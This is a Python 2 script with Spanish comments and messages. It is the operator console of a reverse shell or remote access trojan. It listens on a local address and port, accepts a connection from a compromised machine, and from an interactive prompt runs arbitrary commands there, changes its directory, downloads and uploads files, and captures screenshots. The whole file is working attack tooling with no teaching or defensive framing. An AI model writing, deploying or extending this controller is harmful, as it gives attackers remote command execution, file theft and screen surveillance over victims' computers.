#!/usr/bin/env python
#_*_coding: utf8 _*_

import socket
import base64

def shell():
    current_dir = target.recv(1024)
    count = 1
    while True:
        comando = raw_input("{}~> ".format(current_dir))
        
        if comando=="exit":
            target.send(comando)
            break
        
        elif comando[:2] == "cd":
            target.send(comando)
            res = target.recv(1024)
            current_dir = res
            print(res)
        elif comando == "":
            pass
        
        elif comando[:8] == "download":
            target.send(comando)
            with open(comando[9:], 'wb') as file_download:
                datos = target.recv(30000)
                file_download.write(base64.b64decode(datos))
        
        elif comando[:6] == "upload":
            try:
                target.send(comando)
                with open(comando[7:], 'rb') as file_upload:
                    target.send(base64.b64encode(file_upload.read()))
            except:
                print("ocurrió un error en la subida")
        elif comando[:10]=="screenshot":
            target.send(comando)
            with open("monitor_%d.png" % count, 'wb') as screen:
                datos=target.recv(1000000)
                image_decode = base64.b64decode(datos)

                if image_decode=="fail":
                    print("no se pueto tomar la captura de pantalla")
                else:
                    screen.write(image_decode)
                    print("screen tomada")
                    count+=1
        else:
            target.send(comando)
            res = target.recv(1024)
            if res == "1":
                continue
            else:
                print(res)

def up_server():
    global server
    global ip
    global target

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('192.168.1.13', 7777))
    server.listen(1)


    print("Corriendo Servidor.\nEsperando Conexiones...")

    target, ip = server.accept()
    print("Conexion recibida de: " + str(ip[0]))

up_server()
shell()
server.close()

